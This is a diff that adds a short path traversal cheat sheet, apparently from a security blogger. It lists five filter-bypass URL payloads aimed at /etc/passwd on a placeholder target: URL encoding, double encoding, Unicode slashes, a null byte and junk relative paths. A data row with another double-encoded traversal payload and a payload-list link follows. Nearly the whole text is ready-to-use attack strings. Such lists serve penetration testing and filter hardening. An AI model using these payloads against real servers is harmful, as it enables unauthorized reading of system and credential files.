@@ -1,3 +1,27 @@
+ASWIN K V | deepmarketer
+
+Path Traversal
+
+Bypass Filters
+If basic attempts fail, try evasion techniques:
+
+1.URL Encoding:
+https://target.com/download?file=..%2F..%2Fetc%2Fpasswd
+
+2.Double Encoding:
+https://target.com/download?file=%252E%252E%252F%252E%252E%252Fetc%2Fpasswd
+
+3.Unicode:
+https://target.com/download?file=..\u2215..\u2215etc\u2215passwd (if Unicode normalization is mishandled).
+
+4.Null Byte (older systems):
+https://target.com/download?file=../../../etc/passwd%00.txt
+
+5.Relative Paths with Junk:
+https://target.com/download?file=/valid/path/../../../../etc/passwd
+-----------------
+
+
 57	directory traversal	Payload: /****/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd	https://github.com/ifconfig-me/Directory-Traversal-Payloads/blob/main/payloads.txt														
 
 
